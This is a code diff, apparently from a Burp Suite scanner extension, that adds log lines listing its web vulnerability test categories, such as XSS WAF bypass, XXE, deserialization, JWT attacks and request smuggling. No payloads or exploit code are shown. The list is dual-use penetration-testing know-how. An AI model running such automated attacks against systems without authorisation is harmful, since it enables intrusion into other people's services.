+logging().logToOutput("Cat 4. Input Validation & Encoding:");
+logging().logToOutput("   - XSS (4a) - Polyglot, DOM, Mutation, WAF Bypass");
+logging().logToOutput("   - Parameter Pollution (4b), JSON Injection (4c), NoSQL (4d)");
+logging().logToOutput("   - XXE (4e) - Blind, OOB, XML Bomb, Billion Laughs");
+logging().logToOutput("   - Path Traversal (4f) - Double Encoding, Null Byte, Unicode");
+logging().logToOutput("   - Deserialization (4g) - Java, PHP, Python, .NET, Ruby, YAML");
+logging().logToOutput("   - CRLF Injection (4h) - Response Splitting, Header Injection");
+logging().logToOutput("   - Mass Assignment (4i), Prototype Pollution (4j)");
+logging().logToOutput("   - File Upload Bypass (4k), Business Logic (4l), Unicode (4m)");
+logging().logToOutput("");
+logging().logToOutput("--- PER-REQUEST TESTS (headers/methods) ---");
+logging().logToOutput("Cat 5. Authentication & Session - Auth Headers (5a), JWT Attacks (5b), Token Removal (5c)");
+logging().logToOutput("Cat 6. Authorization & Privilege Escalation - Privilege Escalation Headers (6a)");
+logging().logToOutput("Cat 7. HTTP Protocol & Methods - Method Testing (7a), Verb Tampering (7b), URL Manipulation (7c)");
+logging().logToOutput("Cat 8. Content Type & Headers:");
+logging().logToOutput("   - Content-Type Bypass (8a), CORS Misconfiguration (8b)");
+logging().logToOutput("   - Host Header Injection (8c), Cache Poisoning (8d)");
+logging().logToOutput("Cat 9. Security Headers & Configuration:");
+logging().logToOutput("   - Security Headers Analysis (9a), Cookie Security (9c)");
+logging().logToOutput("Cat 10. Advanced Attacks:");
+logging().logToOutput("   - GraphQL Testing (10a) - Introspection, Injection, DoS");
+logging().logToOutput("   - HTTP Request Smuggling (10b) - CL.TE, TE.CL, TE.TE variations");
+logging().logToOutput("[ ======================================= ]");
+logging().logToOutput("");
+logging().logToOutput("*** COVERAGE: 35+ Vulnerability Categories ***");
+logging().logToOutput("*** PAYLOADS: 1000+ Attack Vectors ***");
+logging().logToOutput("*** FULLY AUTOMATED TESTING ***");
+logging().logToOutput("[ ======================================= ]");
